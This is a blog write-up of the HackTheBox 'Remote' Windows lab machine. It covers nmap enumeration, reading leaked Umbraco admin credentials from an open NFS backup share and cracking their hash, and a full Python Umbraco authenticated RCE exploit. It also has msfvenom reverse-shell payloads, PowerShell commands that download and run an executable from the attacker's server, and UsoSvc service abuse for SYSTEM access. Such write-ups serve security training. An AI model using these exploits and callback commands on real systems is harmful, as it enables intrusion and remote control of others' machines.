<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Remote | CyFun</title><meta name=keywords content="ctf,hackthebox,penetration-testing,writeup,windows,easy"><meta name=description content="Remote HackTheBox writeup"><meta name=author content="s4ch"><link rel=canonical href=https://s4ch.github.io/writeups/hackthebox/remote/><link crossorigin=anonymous href=/assets/css/stylesheet.c5de734fbd88c3d21543485ffbcb1ccdda89a86a780cf987fa00199c41dbc947.css integrity="sha256-xd5zT72Iw9IVQ0hf+8sczdqJqGp4DPmH+gAZnEHbyUc=" rel="preload stylesheet" as=style><link rel=icon href=https://s4ch.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://s4ch.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://s4ch.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://s4ch.github.io/apple-touch-icon.png><link rel=mask-icon href=https://s4ch.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://s4ch.github.io/writeups/hackthebox/remote/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Remote "><meta property="og:description" content="Remote HackTheBox writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://s4ch.github.io/writeups/hackthebox/remote/"><meta property="og:image" content="https://s4ch.github.io/writeups/hackthebox/remote/remote.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2020-09-07T00:00:00+00:00"><meta property="article:modified_time" content="2025-08-18T17:55:49+05:30"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/tenet/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/scriptkiddie/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/delivery/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/ready/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/laboratory/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/passage/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://s4ch.github.io/writeups/hackthebox/remote/remote.png"><meta name=twitter:title content="Remote "><meta name=twitter:description content="Remote HackTheBox writeup"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://s4ch.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"HackTheBox Writeups","item":"https://s4ch.github.io/writeups/hackthebox/"},{"@type":"ListItem","position":3,"name":"Remote ","item":"https://s4ch.github.io/writeups/hackthebox/remote/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Remote ","name":"Remote ","description":"Remote HackTheBox writeup","keywords":["ctf","hackthebox","penetration-testing","writeup","windows","easy"],"articleBody":"Information Name: Remote Profile: www.hackthebox.eu Difficulty: Easy OS: Windows Points: 20 Overview TL;DR: exploiting Umbraco CMS RCE \u0026 pe through a Windows service.\nInstall tools used in this WU on BlackArch Linux:\npacman -S nmap nfs-utils exploitdb metasploit Network enumeration Nmap port discovery \u0026 service:\n# Nmap 7.80 scan initiated Thu Mar 26 23:51:54 2020 as: nmap -A -o nmap_full 10.10.10.180 Nmap scan report for 10.10.10.180 Host is up (0.031s latency). Not shown: 993 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd |_ftp-anon: Anonymous FTP login allowed (FTP code 230) | ftp-syst: |_ SYST: Windows_NT 80/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Home - Acme Widgets 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/tcp6 rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 2,3,4 111/udp6 rpcbind | 100003 2,3 2049/udp nfs | 100003 2,3 2049/udp6 nfs | 100003 2,3,4 2049/tcp nfs | 100003 2,3,4 2049/tcp6 nfs | 100005 1,2,3 2049/tcp mountd | 100005 1,2,3 2049/tcp6 mountd | 100005 1,2,3 2049/udp mountd | 100005 1,2,3 2049/udp6 mountd | 100021 1,2,3,4 2049/tcp nlockmgr | 100021 1,2,3,4 2049/tcp6 nlockmgr | 100021 1,2,3,4 2049/udp nlockmgr | 100021 1,2,3,4 2049/udp6 nlockmgr | 100024 1 2049/tcp status | 100024 1 2049/tcp6 status | 100024 1 2049/udp status |_ 100024 1 2049/udp6 status 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 2049/tcp open mountd 1-3 (RPC #100005) 5985/tcp open wsman No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.80%E=4%D=3/26%OT=21%CT=1%CU=31453%PV=Y%DS=2%DC=T%G=Y%TM=5E7D326 OS:0%P=x86_64-unknown-linux-gnu)SEQ(SP=104%GCD=1%ISR=108%TI=I%CI=I%II=I%SS= OS:S%TS=U)SEQ(SP=100%GCD=1%ISR=106%CI=I%II=I%TS=U)OPS(O1=M54DNW8NNS%O2=M54D OS:NW8NNS%O3=M54DNW8%O4=M54DNW8NNS%O5=M54DNW8NNS%O6=M54DNNS)WIN(W1=FFFF%W2= OS:FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M54DNW8N OS:NS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S OS:=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R OS:=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F= OS:AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T= OS:80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID OS:=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z) Network Distance: 2 hops Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 2m31s | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2020-03-26T22:55:29 |_ start_date: N/A TRACEROUTE (using port 80/tcp) HOP RTT ADDRESS 1 30.61 ms 10.10.14.1 2 30.75 ms 10.10.10.180 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Mar 26 23:53:20 2020 -- 1 IP address (1 host up) scanned in 86.43 seconds Discovery We can find some interesting pages on the web server:\nhttp://10.10.10.180/people/ http://10.10.10.180/about-us/todo-list-for-the-starter-kit/ http://10.10.10.180/umbraco/#/login/false?returnPath=%252Fforms The last one suggests an Umbraco CMS is used.\nAlso the mountd service allow us to list mounts and as there is a public nfs share we can mount it:\n$ showmount -e 10.10.10.180 Export list for 10.10.10.180: /site_backups (everyone) $ sudo mount 10.10.10.180:/site_backups $(pwd)/dossier Then we can find a file leaking the Umbraco admin credentials:\n$ strings App_Data/Umbraco.sdf | grep admin@htb adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{\"hashAlgorithm\":\"SHA1\"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50 adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{\"hashAlgorithm\":\"SHA1\"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f With CrackStation is cracked the hash, so the credentials are:\nadmin@htb.local / baconandcheese\nWe can log in with them and then generate a reverse shell with metasploit:\n$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.222 LPORT=9999 -f aspx \u003e shell.aspx But afterward I saw .aspx extension is disallowed:\n$ cat dossier/Config/umbracoSettings.config| grep disallowedUploadFiles ashx,aspx,ascx,config,cshtml,vbhtml,asmx,air,axd,swf,xml,xhtml,html,htm,svg,php,htaccess So uploading a webshell through the webUI won’t be possible.\nHTTP exploitation We can look for an Umbraco exploit to get a RCE:\n$ searchsploit umbraco -------------------------------------------------------------------------------------------- ---------------------------------------- Exploit Title | Path | (/usr/share/exploitdb/) -------------------------------------------------------------------------------------------- ---------------------------------------- Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution | exploits/aspx/webapps/46153.py Umbraco CMS - Remote Command Execution (Metasploit) | exploits/windows/webapps/19671.rb Umbraco CMS SeoChecker Plugin 1.9.2 - Cross-Site Scripting | exploits/php/webapps/44988.txt -------------------------------------------------------------------------------------------- ---------------------------------------- Shellcodes: No Result import requests import re import argparse from bs4 import BeautifulSoup parser = argparse.ArgumentParser(prog='exploit.py', description='Umbraco authenticated RCE', formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=80)) parser.add_argument('-u', '--user', metavar='USER', type=str, required=True, dest='user', help='username / email') parser.add_argument('-p', '--password', metavar='PASS', type=str, required=True, dest='password', help='password') parser.add_argument('-i', '--host', metavar='URL', type=str, required=True, dest='url', help='root URL') parser.add_argument('-c', '--command', metavar='CMD', type=str, required=True, dest='command', help='command') parser.add_argument('-a', '--arguments', metavar='ARGS', type=str, required=False, dest='arguments', help='arguments', default='') args = parser.parse_args() # Payload payload = \"\"\"\\ \u003c?xml version=\"1.0\"?\u003epublic string xml() { string cmd = \"%s\"; System.Diagnostics.Process proc = new System.Diagnostics.Process(); proc.StartInfo.FileName = \"%s\"; proc.StartInfo.Arguments = cmd; proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \\ \"\"\" % (args.arguments, args.command) login = args.user password = args.password host = args.url # Process Login url_login = host + \"/umbraco/backoffice/UmbracoApi/Authentication/PostLogin\" loginfo = { \"username\": login, \"password\": password} s = requests.session() r2 = s.post(url_login,json=loginfo) # Go to vulnerable web page url_xslt = host + \"/umbraco/developer/Xslt/xsltVisualize.aspx\" r3 = s.get(url_xslt) soup = BeautifulSoup(r3.text, 'html.parser') VIEWSTATE = soup.find(id=\"__VIEWSTATE\")['value'] VIEWSTATEGENERATOR = soup.find(id=\"__VIEWSTATEGENERATOR\")['value'] UMBXSRFTOKEN = s.cookies['UMB-XSRF-TOKEN'] headers = {'UMB-XSRF-TOKEN': UMBXSRFTOKEN} data = { \"__EVENTTARGET\": \"\", \"__EVENTARGUMENT\": \"\", \"__VIEWSTATE\": VIEWSTATE, \"__VIEWSTATEGENERATOR\": VIEWSTATEGENERATOR, \"ctl00$body$xsltSelection\": payload, \"ctl00$body$contentPicker$ContentIdValue\": \"\", \"ctl00$body$visualizeDo\": \"Visualize+XSLT\" } # Launch the attack r4 = s.post(url_xslt, data=data, headers=headers) # Filter output soup = BeautifulSoup(r4.text, 'html.parser') CMDOUTPUT = soup.find(id=\"result\").getText() print(CMDOUTPUT) This time we can generate an exe reverse shell (rather than aspx webshell), use the above RCE exploit to get a powershell shell, upload the reverse shell, and gain shell access:\n$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.222 LPORT=9999 -f exe \u003e reverse.exe $ python -m http.server --bind 10.10.15.222 8080 $ python exploit.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a '-NoProfile -Command ls' Directory: C:\\windows\\system32\\inetsrv Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 2/19/2020 3:11 PM Config d----- 2/19/2020 3:11 PM en d----- 2/19/2020 3:11 PM en-US ... $ python exploit.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a '-NoProfile -Command wget http://10.10.15.222:8080/reverse.exe -OutFile C:/Users/Public/cyfun.exe' $ python exploit.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a '-NoProfile -Command C:/Users/Public/cyfun.exe' PS C:\\windows\\system32\\inetsrv\u003e gc C:/Users/Public/user.txt 8eb35aa443795d5f4f306c100344e0d7 Privilege Escalation of Machine Some enumeration tools show exploitable services like UsoSvc so I found an article explaining the attack: CVE-2019-1405 and CVE-2019-1322 - Elevation to SYSTEM via the UPnP Device Host Service and the Update Orchestrator Service.\nsc config UsoSvc binpath= \"cmd.exe /c copy C:\\\\Users\\\\Administrator\\\\Desktop\\\\root.txt C:\\\\windows\\\\system32\\\\cyfun.txt \u0026\" sc config UsoSvc binpath= \"cmd.exe /c copy del C:\\\\windows\\\\system32\\\\cyfun.txt \u0026\" C:\\windows\\system32\\inetsrv\u003etype C:\\windows\\system32\\cyfun.txt 9421fa1e9e59dd1a93d10a7efd87b5c2 sc config UsoSvc binpath= \"cmd.exe /c del C:\\\\windows\\\\system32\\\\cyfun.txt \u0026\" ","wordCount":"972","inLanguage":"en","image":"https://s4ch.github.io/writeups/hackthebox/remote/remote.png","datePublished":"2020-09-07T00:00:00Z","dateModified":"2025-08-18T17:55:49+05:30","author":{"@type":"Person","name":"s4ch"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4ch.github.io/writeups/hackthebox/remote/"},"publisher":{"@type":"Organization","name":"CyFun","logo":{"@type":"ImageObject","url":"https://s4ch.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://s4ch.github.io/ accesskey=h title="CyFun (Alt + H)">CyFun</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://s4ch.github.io/about/ title=About><span>About</span></a></li><li><a href=https://s4ch.github.io/contact/ title=Contact><span>Contact</span></a></li><li><a href=https://s4ch.github.io/research/ title=Research><span>Research</span></a></li><li><a href=https://s4ch.github.io/archives title=Archives><span>Archives</span></a></li><li><a href=https://s4ch.github.io/writeups/ title=Writeups><span>Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Remote</h1><div class=post-description>Remote HackTheBox writeup</div><div class=post-meta>&lt;span title='2020-09-07 00:00:00 +0000 UTC'>September 7, 2020&lt;/span>&amp;nbsp;·&amp;nbsp;5 min&amp;nbsp;·&amp;nbsp;972 words&amp;nbsp;·&amp;nbsp;
&lt;a href="https://s4ch.github.io/tags/ctf/" class="post-tag" title="ctf">ctf&lt;/a>
,
&lt;a href="https://s4ch.github.io/tags/hackthebox/" class="post-tag" title="hackthebox">hackthebox&lt;/a>
,
&lt;a href="https://s4ch.github.io/tags/penetration-testing/" class="post-tag" title="penetration-testing">penetration-testing&lt;/a>
,
&lt;a href="https://s4ch.github.io/tags/writeup/" class="post-tag" title="writeup">writeup&lt;/a>
,
&lt;a href="https://s4ch.github.io/tags/windows/" class="post-tag" title="windows">windows&lt;/a>
,
&lt;a href="https://s4ch.github.io/tags/easy/" class="post-tag" title="easy">easy&lt;/a>
&amp;nbsp;·&amp;nbsp;
&lt;a href="https://s4ch.github.io/categories/writeups/" class="post-tag" title="writeups">writeups&lt;/a>
&amp;nbsp;·&amp;nbsp;&lt;a href=".RelPermalink">permalink&lt;/a></div></header><figure class=entry-cover><img loading=eager src=https://s4ch.github.io/writeups/hackthebox/remote/remote.png alt="Remote HackTheBox Machine"><p>Remote - Easy Windows Machine</p></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#overview>Overview</a></li><li><a href=#network-enumeration>Network enumeration</a></li><li><a href=#discovery>Discovery</a></li><li><a href=#http-exploitation>HTTP exploitation</a></li><li><a href=#privilege-escalation-of-machine>Privilege Escalation of Machine</a></li></ul></nav></div></details></div><div class=post-content><h1 id=information>Information<a hidden class=anchor aria-hidden=true href=#information>#</a></h1><ul><li><strong>Name:</strong> Remote</li><li><strong>Profile:</strong> <a href=https://www.hackthebox.eu/home/machines/profile/234>www.hackthebox.eu</a></li><li><strong>Difficulty:</strong> Easy</li><li><strong>OS:</strong> Windows</li><li><strong>Points:</strong> 20</li></ul><h2 id=overview>Overview<a hidden class=anchor aria-hidden=true href=#overview>#</a></h2><p><strong>TL;DR</strong>: exploiting Umbraco CMS RCE & pe through a Windows service.</p><p>Install tools used in this WU on BlackArch Linux:</p><pre tabindex=0><code>pacman -S nmap nfs-utils exploitdb metasploit
</code></pre><h2 id=network-enumeration>Network enumeration<a hidden class=anchor aria-hidden=true href=#network-enumeration>#</a></h2><p><a href=https://nmap.org/>Nmap</a> port discovery & service:</p><pre tabindex=0><code># Nmap 7.80 scan initiated Thu Mar 26 23:51:54 2020 as: nmap -A -o nmap_full 10.10.10.180
Nmap scan report for 10.10.10.180
Host is up (0.031s latency).
Not shown: 993 closed ports
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
2049/tcp open  mountd        1-3 (RPC #100005)
5985/tcp open  wsman
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=3/26%OT=21%CT=1%CU=31453%PV=Y%DS=2%DC=T%G=Y%TM=5E7D326
OS:0%P=x86_64-unknown-linux-gnu)SEQ(SP=104%GCD=1%ISR=108%TI=I%CI=I%II=I%SS=
OS:S%TS=U)SEQ(SP=100%GCD=1%ISR=106%CI=I%II=I%TS=U)OPS(O1=M54DNW8NNS%O2=M54D
OS:NW8NNS%O3=M54DNW8%O4=M54DNW8NNS%O5=M54DNW8NNS%O6=M54DNNS)WIN(W1=FFFF%W2=
OS:FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M54DNW8N
OS:NS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S
OS:=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R
OS:=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=
OS:AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=
OS:80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID
OS:=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 2m31s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-03-26T22:55:29
|_  start_date: N/A

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   30.61 ms 10.10.14.1
2   30.75 ms 10.10.10.180

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Mar 26 23:53:20 2020 -- 1 IP address (1 host up) scanned in 86.43 seconds
</code></pre><h2 id=discovery>Discovery<a hidden class=anchor aria-hidden=true href=#discovery>#</a></h2><p>We can find some interesting pages on the web server:</p><ul><li>http://10.10.10.180/people/</li><li>http://10.10.10.180/about-us/todo-list-for-the-starter-kit/</li><li>http://10.10.10.180/umbraco/#/login/false?returnPath=%252Fforms</li></ul><p>The last one suggests an Umbraco CMS is used.</p><p>Also the mountd service allow us to list mounts and as there is a public
nfs share we can mount it:</p><pre tabindex=0><code>$ showmount -e 10.10.10.180
Export list for 10.10.10.180:
/site_backups (everyone)

$ sudo mount 10.10.10.180:/site_backups $(pwd)/dossier
</code></pre><p>Then we can find a file leaking the Umbraco admin credentials:</p><pre tabindex=0><code>$ strings App_Data/Umbraco.sdf | grep admin@htb
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{&#34;hashAlgorithm&#34;:&#34;SHA1&#34;}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{&#34;hashAlgorithm&#34;:&#34;SHA1&#34;}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
</code></pre><p>With <a href=https://inventory.raw.pm/tools.html#CrackStation>CrackStation</a> is cracked the hash, so the credentials are:</p><p><code>admin@htb.local</code> / <code>baconandcheese</code></p><p>We can log in with them and then generate a reverse shell with <a href=https://www.metasploit.com/>metasploit</a>:</p><pre tabindex=0><code>$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.222 LPORT=9999 -f aspx &gt; shell.aspx
</code></pre><p>But afterward I saw <code>.aspx</code> extension is disallowed:</p><pre tabindex=0><code>$ cat dossier/Config/umbracoSettings.config| grep disallowedUploadFiles
    &lt;disallowedUploadFiles&gt;ashx,aspx,ascx,config,cshtml,vbhtml,asmx,air,axd,swf,xml,xhtml,html,htm,svg,php,htaccess&lt;/disallowedUploadFiles&gt;
</code></pre><p>So uploading a webshell through the webUI won&rsquo;t be possible.</p><h2 id=http-exploitation>HTTP exploitation<a hidden class=anchor aria-hidden=true href=#http-exploitation>#</a></h2><p>We can look for an Umbraco exploit to get a RCE:</p><pre tabindex=0><code>$ searchsploit umbraco
-------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                              |  Path
                                                                                            | (/usr/share/exploitdb/)
-------------------------------------------------------------------------------------------- ----------------------------------------
Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution                                  | exploits/aspx/webapps/46153.py
Umbraco CMS - Remote Command Execution (Metasploit)                                         | exploits/windows/webapps/19671.rb
Umbraco CMS SeoChecker Plugin 1.9.2 - Cross-Site Scripting                                  | exploits/php/webapps/44988.txt
-------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> re
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> argparse
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> bs4 <span style=color:#f92672>import</span> BeautifulSoup
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>parser <span style=color:#f92672>=</span> argparse<span style=color:#f92672>.</span>ArgumentParser(prog<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;exploit.py&#39;</span>,
</span></span><span style=display:flex><span>    description<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;Umbraco authenticated RCE&#39;</span>,
</span></span><span style=display:flex><span>    formatter_class<span style=color:#f92672>=</span><span style=color:#66d9ef>lambda</span> prog: argparse<span style=color:#f92672>.</span>HelpFormatter(prog,max_help_position<span style=color:#f92672>=</span><span style=color:#ae81ff>80</span>))
</span></span><span style=display:flex><span>parser<span style=color:#f92672>.</span>add_argument(<span style=color:#e6db74>&#39;-u&#39;</span>, <span style=color:#e6db74>&#39;--user&#39;</span>, metavar<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;USER&#39;</span>, type<span style=color:#f92672>=</span>str,
</span></span><span style=display:flex><span>    required<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>, dest<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;user&#39;</span>, help<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;username / email&#39;</span>)
</span></span><span style=display:flex><span>parser<span style=color:#f92672>.</span>add_argument(<span style=color:#e6db74>&#39;-p&#39;</span>, <span style=color:#e6db74>&#39;--password&#39;</span>, metavar<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;PASS&#39;</span>, type<span style=color:#f92672>=</span>str,
</span></span><span style=display:flex><span>    required<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>, dest<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;password&#39;</span>, help<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;password&#39;</span>)
</span></span><span style=display:flex><span>parser<span style=color:#f92672>.</span>add_argument(<span style=color:#e6db74>&#39;-i&#39;</span>, <span style=color:#e6db74>&#39;--host&#39;</span>, metavar<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;URL&#39;</span>, type<span style=color:#f92672>=</span>str, required<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>,
</span></span><span style=display:flex><span>    dest<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;url&#39;</span>, help<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;root URL&#39;</span>)
</span></span><span style=display:flex><span>parser<span style=color:#f92672>.</span>add_argument(<span style=color:#e6db74>&#39;-c&#39;</span>, <span style=color:#e6db74>&#39;--command&#39;</span>, metavar<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;CMD&#39;</span>, type<span style=color:#f92672>=</span>str, required<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>,
</span></span><span style=display:flex><span>    dest<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;command&#39;</span>, help<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;command&#39;</span>)
</span></span><span style=display:flex><span>parser<span style=color:#f92672>.</span>add_argument(<span style=color:#e6db74>&#39;-a&#39;</span>, <span style=color:#e6db74>&#39;--arguments&#39;</span>, metavar<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;ARGS&#39;</span>, type<span style=color:#f92672>=</span>str, required<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>,
</span></span><span style=display:flex><span>    dest<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;arguments&#39;</span>, help<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;arguments&#39;</span>, default<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;&#39;</span>)
</span></span><span style=display:flex><span>args <span style=color:#f92672>=</span> parser<span style=color:#f92672>.</span>parse_args()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Payload</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;&#34;</span><span style=color:#ae81ff>\
